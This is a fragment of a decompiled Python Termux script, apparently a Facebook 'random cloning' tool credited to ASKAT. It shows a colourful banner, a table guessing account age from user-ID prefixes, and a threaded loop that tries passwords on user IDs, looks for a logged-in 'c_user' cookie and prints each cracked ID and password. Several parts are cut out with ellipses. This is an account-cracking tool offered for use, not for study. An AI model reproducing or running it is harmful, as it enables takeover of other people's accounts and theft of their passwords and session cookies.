# Decompile by Mardis (Tools By ASKAT)
...
logo = ("""
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m ASKAT MRIDHA     \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m ASKAT MRIDHA    \033[1;32m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35maskat101        \033[1;32m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈       \033[1;32m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35 ASKAT CMD ZONE  \033[1;32m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m ASKAT  TERMUX COMMEND ZONE....          \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m ASKAT - 𝑵𝑶𝑶𝑩 \033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :askat = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :raskat = '√ 2009'
        elif uid[:8] in ['10000000']        :askat = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:askat = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:askat = ' 2010'
        elif uid[:6] in ['100001']          :askat = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :askat = '√ 2011/2012'
        elif uid[:6] in ['100004']          :askat = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :askat = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :askat = '√ 2014/2015'
        elif uid[:6] in ['100009']          :askat = '√ 2015'
        elif uid[:5] in ['10001']           :askat = '√ 2015/2016'
        elif uid[:5] in ['10002']           :askat = '√ 2016/2017'
        elif uid[:5] in ['10003']           :askat = '√ 2018/2019'
        elif uid[:5] in ['10004']           :askat = '√ 2019/2020'
        elif uid[:5] in ['10005']           :askat = '√ 2020'
        elif uid[:5] in ['10006','10007','']:askat = '√ 2021'
        elif uid[:5] in ['10008']           :askat = '√ 2022'
        elif uid[:5] in ['10009']           :askat = '√ 2023'
        else:askat=''
...
def askat():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m ASKAT')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m [ASKAT-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
